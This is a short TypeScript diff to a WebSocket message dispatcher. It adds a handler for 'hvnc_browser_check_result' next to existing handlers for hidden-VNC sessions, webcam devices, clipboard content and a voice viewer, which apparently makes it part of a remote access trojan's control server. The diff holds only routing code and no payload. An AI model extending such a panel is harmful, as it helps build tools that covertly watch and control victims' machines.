@@ -85,6 +85,7 @@ type WsLifecycleDeps = {
   handleWebcamDevices: (clientId: string, payload: any) => void;
   handleHVNCCloneProgress: (clientId: string, payload: any) => void;
   handleHVNCLookupResult: (clientId: string, payload: any) => void;
+  handleHVNCBrowserCheckResult: (clientId: string, payload: any) => void;
   handleHVNCDXGIStatus: (clientId: string, payload: any) => void;
   handleClipboardContent: (clientId: string, payload: any) => void;
   cleanupVoiceViewer: (ws: ServerWebSocket<SocketData>) => void;
@@ -611,6 +612,9 @@ export async function handleWebSocketMessage(
         break;
       case "hvnc_lookup_result":
         deps.handleHVNCLookupResult(client.id, payload);
+        break;
+      case "hvnc_browser_check_result":
+        deps.handleHVNCBrowserCheckResult(client.id, payload);
         break;
       case "hvnc_dxgi_status":
         deps.handleHVNCDXGIStatus(client.id, payload);
